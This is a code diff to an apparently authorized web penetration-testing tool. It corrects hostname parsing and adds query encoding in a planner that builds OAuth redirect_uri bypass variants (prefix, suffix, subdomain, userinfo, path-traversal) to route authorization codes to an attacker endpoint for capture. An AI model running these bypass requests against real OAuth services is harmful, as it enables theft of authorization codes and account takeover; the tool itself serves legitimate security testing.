@@ -13,6 +13,7 @@ from __future__ import annotations
 import hashlib
 from dataclasses import dataclass, field
 from typing import Any
+from urllib.parse import quote, urlsplit
 
 from webpent.families.base import FamilyCandidate
 
@@ -111,6 +112,55 @@ def build_multi_step_auth_plan(
     )
 
 
+def _attacker_origin(attacker_redirect_uri: str) -> str:
+    """Extract the attacker's host[:port] from a redirect URI.
+
+    UM-DR-41 §5.2: the previous implementation stripped the scheme with
+    ``attacker_redirect_uri.lstrip('https://')`` — which is NOT prefix
+    removal but a leading-CHARACTER-SET strip, so any hostname starting
+    with h/t/p/s lost its first letters (``https://hacker.example`` →
+    ``acker.example``). This helper uses real URL parsing instead: only
+    http/https schemes are admitted, and the returned origin is the
+    parsed netloc (host[:port]) with no userinfo — a malformed URI or
+    an unsupported scheme yields an empty string so the caller's
+    variant never fabricates a valid-looking bypass payload.
+    """
+    try:
+        parsed = urlsplit(str(attacker_redirect_uri or "").strip())
+    except ValueError:
+        return ""
+    if parsed.scheme not in {"http", "https"}:
+        return ""
+    host = (parsed.hostname or "").strip().rstrip(".")
+    if not host:
+        return ""
+    # RFC 3986: IPv6 literals keep their brackets inside a netloc; the
+    # suffix/subdomain variants concatenate the origin onto other hosts,
+    # where a bare (bracketless) literal would be ambiguous.
+    if ":" in host and not host.startswith("["):
+        host = f"[{host}]"
+    netloc = host.lower() if parsed.scheme == "https" else host
+    try:
+        port = parsed.port
+    except ValueError:
+        return ""
+    if port is not None and port != (443 if parsed.scheme == "https" else 80):
+        netloc = f"{netloc}:{port}"
+    return netloc
+
+
+def _attacker_path(attacker_redirect_uri: str) -> str:
+    """Path component of the attacker URI (no query/fragment), / when empty."""
+    try:
+        parsed = urlsplit(str(attacker_redirect_uri or "").strip())
+    except ValueError:
+        return "/"
+    if parsed.scheme not in {"http", "https"}:
+        return "/"
+    path = parsed.path or "/"
+    return path if path.startswith("/") else f"/{path}"
+
+
 def build_oauth_plan(
     candidate: FamilyCandidate,
     *,
@@ -123,26 +173,52 @@ def build_oauth_plan(
 
     Variants: prefix, suffix, subdomain, userinfo(@), path-traversal,
     exact-match-negative. The attacker endpoint captures the code.
+
+    UM-DR-41 §5.2: every variant is now built from the PARSED attacker
+    origin (host[:port]) and path — never from a stripped string. The
+    authorize URL's query parameters are percent-encoded via ``quote``
+    so a redirect_uri containing ``&``, ``=``, spaces or unicode
+    round-trips as ONE parameter value instead of splitting the query.
+    A malformed attacker URI (unsupported scheme, missing host) yields
+    an empty redirect value for the variant, keeping malformed payloads
+    from being treated as valid bypass tests.
     """
+    origin = _attacker_origin(attacker_redirect_uri)
+    path = _attacker_path(attacker_redirect_uri)
     variants = {
         "prefix": f"{attacker_redirect_uri}.legit.com",
-        "suffix": f"https://legit.com.{attacker_redirect_uri.lstrip('https://')}",
-        "subdomain": f"https://{attacker_redirect_uri}.legit.com",
-        "userinfo": f"https://legit.com@{attacker_redirect_uri.lstrip('https://')}",
-        "path_traversal": f"https://legit.com/../{attacker_redirect_uri.lstrip('https://')}",
+        "suffix": f"https://legit.com.{origin}{path}",
+        "subdomain": f"https://{origin}.legit.com{path}",
+        "userinfo": f"https://legit.com@{origin}{path}",
+        "path_traversal": f"https://legit.com/../{origin}{path}",
     }
     redirect_uri = variants.get(bypass_variant, attacker_redirect_uri)
     state = _digest(f"oauth-state-{candidate.candidate_id}")
+    # Percent-encode each parameter value exactly once: the values are
+    # full URIs and free-text identifiers that may contain reserved
+    # query characters. safe='' keeps '/' encoded consistently for all
+    # parameters so there is no double-encoding or mixed encoding.
+    query = "&".join(
+        f"{key}={quote(str(value), safe='')}"
+        for key, value in (
+            ("response_type", "code"),
+            ("client_id", client_id),
+            ("redirect_uri", redirect_uri),
+            ("state", state),
+            ("scope", "openid"),
+        )
+    )
     authorize = RequestPlan(
         method="GET",
-        url=(f"{authorize_url}?response_type=code&client_id={client_id}"
-             f"&redirect_uri={redirect_uri}&state={state}&scope=openid"),
+        url=f"{authorize_url}?{query}",
         label=f"oauth-authorize-{bypass_variant}",
     )
     negative = RequestPlan(
         method="GET",
-        url=(f"{authorize_url}?response_type=code&client_id={client_id}"
-             f"&redirect_uri=https://registered-callback.legit.com/callback&state={state}"),
+        url=(f"{authorize_url}?response_type=code&client_id="
+             f"{quote(str(client_id), safe='')}"
+             f"&redirect_uri={quote('https://registered-callback.legit.com/callback', safe='')}"
+             f"&state={quote(state, safe='')}"),
         label="oauth-exact-redirect-negative",
     )
     attacker_capture = RequestPlan(method="GET", url=attacker_redirect_uri, label="attacker-code-capture")
